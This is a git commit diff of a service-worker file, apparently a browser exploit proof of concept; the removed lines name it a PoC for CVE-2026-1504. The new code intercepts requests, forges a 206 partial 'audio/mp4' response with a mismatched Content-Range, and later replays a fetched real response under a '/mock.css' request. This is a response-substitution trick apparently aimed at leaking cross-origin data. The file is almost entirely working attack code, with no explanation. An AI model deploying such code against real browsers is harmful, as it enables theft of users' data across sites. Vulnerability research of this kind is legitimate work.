11d5b5d20f3755b4ed9fafa5e70026d8b258ddbb
neu-azhe <97437564+neu-azhe@users.noreply.github.com>
2026-09-02 16:20:15 +0800

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,12 +1,26 @@
-// sw.js - Service Worker for Background Fetch (CVE-2026-1504 PoC)
+'use strict';
 
-self.addEventListener('backgroundfetchsuccess', (event) => {
-    const bgFetch = event.registration;
-    event.waitUntil(async function() {
-        const records = await bgFetch.matchAll();
-        for (const record of records) {
-            const response = await record.responseReady;
-            console.log('Fetched data:', await response.text());
-        }
-    }());
+let response;
+
+self.addEventListener("install", () => {
+    self.skipWaiting();
+});
+
+self.addEventListener("fetch", async (e) => {
+	console.log(e.request.url);
+	let url = new URL(e.request.url);
+	let urlParams = new URLSearchParams(url.search);
+	let size = urlParams.get("size");
+	let body = "A".repeat(Number(size));
+
+	if (e.request.headers.get("range") === "bytes=0-") {
+		e.respondWith(new Response(body, {status: 206, headers: {
+			"Content-Type": "audio/mp4",
+			"Content-Range": "bytes 0-1/13337"
+		}}));
+	} else if (e.request.headers.get("range") === `bytes=${Number(size)}-`) {
+		response = await fetch(e.request);
+	} else if (e.request.url.includes("/mock.css")) {
+		e.respondWith(response.clone());
+	}
 });
